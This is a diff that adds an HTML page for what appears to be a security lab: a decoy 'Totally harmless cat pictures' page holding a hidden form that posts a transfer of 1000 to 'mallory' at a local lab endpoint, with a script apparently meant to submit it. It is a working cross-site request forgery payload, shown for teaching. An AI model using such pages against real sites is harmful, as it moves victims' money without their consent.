@@ -1,0 +1,14 @@
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>Totally harmless cat pictures</title></head>
+<body>
+  <h1>Cute cats!</h1>
+  <p>(This page is the attacker's site, served from a different port than the lab.)</p>
+  <!-- Hidden form that silently posts to the lab's transfer endpoint. -->
+  <form id="f" action="http://localhost:5000/api/transfer" method="POST">
+    <input type="hidden" name="to" value="mallory">
+    <input type="hidden" name="amount" value="1000">
+  </form>
+  <script src="/csrf.js"></script>
+</body>
+</html>
